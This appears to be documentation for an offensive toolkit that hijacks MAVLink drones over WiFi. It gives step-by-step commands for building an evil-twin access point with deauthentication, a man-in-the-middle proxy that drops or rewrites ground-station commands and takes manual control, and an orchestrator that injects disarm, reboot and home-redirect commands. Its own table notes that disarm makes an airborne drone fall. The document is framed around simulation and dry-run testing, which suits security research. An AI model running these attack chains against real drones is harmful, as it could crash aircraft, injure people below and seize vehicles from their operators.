# Chain 2: WiFi → MAVLink Injection

## Overview

Chain 2 exploits drones that expose MAVLink telemetry over WiFi. The attack
flow is:

1. **Evil Twin AP** — Create a rogue access point mimicking the drone's WiFi
2. **MitM Proxy** — Intercept MAVLink traffic between GCS and drone  
3. **Command Injection** — Send crafted MAVLink commands (arm/disarm, mode
   change, waypoint override, RTL redirect)

This chain works against any MAVLink-speaking drone accessible over WiFi,
including ArduPilot SITL for testing without hardware.

## Tools

### evil-twin-ap.py

Creates a rogue WiFi access point that mimics a drone's network.

```bash
# Scan for drone APs in range
python3 tools/evil-twin-ap.py scan --interface wlan0

# Create evil twin (dry run)
python3 tools/evil-twin-ap.py clone --ssid TELLO-AABBCC --interface wlan0

# Create evil twin (armed, with deauth)
python3 tools/evil-twin-ap.py clone --ssid MAVLink-Bridge --interface wlan0 \
    --deauth-interface wlan1mon --arm

# Auto-detect and clone first drone AP
python3 tools/evil-twin-ap.py auto --interface wlan0 --arm

# Simulate without hardware
python3 tools/evil-twin-ap.py clone --ssid TELLO-AABBCC --interface wlan0 --simulate
```

**Requirements:** hostapd, dnsmasq, iptables (live mode); aircrack-ng (deauth)

### mavlink-mitm-proxy.py

Transparent UDP proxy that sits between a GCS and drone, logging and
optionally modifying MAVLink traffic.

```bash
# Basic proxy (log all traffic)
python3 tools/mavlink-mitm-proxy.py --gcs-port 14550 --drone 127.0.0.1:5762

# With ArduPilot SITL
python3 tools/mavlink-mitm-proxy.py --gcs-port 14550 --drone 127.0.0.1:5762

# Drop arm/disarm commands from GCS
python3 tools/mavlink-mitm-proxy.py --gcs-port 14550 --drone 127.0.0.1:5762 \
    --drop-cmds 400

# Force all mode changes to RTL
python3 tools/mavlink-mitm-proxy.py --gcs-port 14550 --drone 127.0.0.1:5762 \
    --modify-mode rtl

# Inject RC override (take manual control)
python3 tools/mavlink-mitm-proxy.py --gcs-port 14550 --drone 127.0.0.1:5762 \
    --inject-rc

# Simulate (no network)
python3 tools/mavlink-mitm-proxy.py --simulate

# JSON packet log for analysis
python3 tools/mavlink-mitm-proxy.py --gcs-port 14550 --drone 127.0.0.1:5762 \
    --json-log proxy-capture.json
```

**Proxy architecture:**

```
GCS (QGroundControl)       Drone / SITL
        |                       |
        v                       v
   [GCS-facing socket]   [Drone-facing socket]
        |                       |
        +---[ MitM Proxy  ]----+
            (log/modify/inject/drop)
```

### wifi_mavlink_chain.py (Chain 2 Orchestrator)

Runs the full Chain 2 sequence end-to-end.

```bash
# Full chain — simulated (no hardware)
python3 tools/exploit_chains/wifi_mavlink_chain.py --simulate

# Full chain — dry run against live target
python3 tools/exploit_chains/wifi_mavlink_chain.py --dry-run \
    --target udp:127.0.0.1:14550

# Full chain — armed
python3 tools/exploit_chains/wifi_mavlink_chain.py --arm \
    --target udp:192.168.1.1:14550

# With evil twin
python3 tools/exploit_chains/wifi_mavlink_chain.py --arm \
    --target udp:192.168.4.1:14550 \
    --evil-twin --ssid MAVLink-Bridge --interface wlan0

# Custom commands
python3 tools/exploit_chains/wifi_mavlink_chain.py --arm \
    --target udp:127.0.0.1:14550 \
    --commands disarm land rtl reboot

# JSON output for web UI
python3 tools/exploit_chains/wifi_mavlink_chain.py --simulate \
    --json-output chain2-results.json
```

## Available Injection Commands

| Command | Description | Severity |
|---------|-------------|----------|
| `disarm` | Disarm motors (drone falls if airborne) | Critical |
| `arm` | Arm motors | Warning |
| `land` | Force landing at current position | Warning |
| `rtl` | Return to launch position | Warning |
| `takeoff` | Takeoff to 10m | Warning |
| `mode-land` | Set flight mode to LAND | Warning |
| `mode-rtl` | Set flight mode to RTL | Warning |
| `mode-loiter` | Set flight mode to LOITER | Info |
| `reboot` | Reboot flight controller | Critical |
| `set-home-zero` | Redirect home to (0,0) — RTL goes to ocean | Critical |

## Web UI Integration

The web dashboard (`web/app.py`) exposes Chain 2 API endpoints:

- `GET /api/chain2/status` — Current chain state
- `GET /api/chain2/commands` — Available attack commands
- `POST /api/chain2/simulate` — Run simulated chain attack
- `POST /api/chain2/inject` — Inject a specific MAVLink command

Example API calls:

```bash
# List available commands
curl http://localhost:5000/api/chain2/commands

# Simulate an attack
curl -X POST http://localhost:5000/api/chain2/simulate \
    -H "Content-Type: application/json" \
    -d '{"commands": ["disarm", "land"]}'

# Inject a command (dry-run in simulate mode)
curl -X POST http://localhost:5000/api/chain2/inject \
    -H "Content-Type: application/json" \
    -d '{"command": "rtl", "target_id": "mav:1:1"}'
```

## SITL Testing

All Chain 2 tools work with ArduPilot SITL — no drone hardware needed.

```bash
# Start ArduPilot SITL (in a separate terminal)
sim_vehicle.py -v ArduCopter --map --console

# Run Chain 2 against SITL
python3 tools/exploit_chains/wifi_mavlink_chain.py --arm \
    --target udp:127.0.0.1:14550 --commands disarm land

# Or use the MitM proxy with SITL
python3 tools/mavlink-mitm-proxy.py --gcs-port 14551 \
    --drone 127.0.0.1:14550
# Then connect QGroundControl to localhost:14551
```

## Safety

- All tools default to **dry-run mode** — no commands are transmitted
  without `--arm`
- Simulation mode (`--simulate`) works without any network or hardware
- The MitM proxy logs all traffic for post-analysis
- Emergency stop: Ctrl+C cleanly shuts down all processes

## Adapter Compatibility

The evil twin AP works with any WiFi adapter that supports AP mode via
hostapd (most USB adapters with nl80211 drivers). The deauth feature
requires a monitor-mode capable adapter. The MAVLink tools work over
standard UDP sockets and need no special hardware.
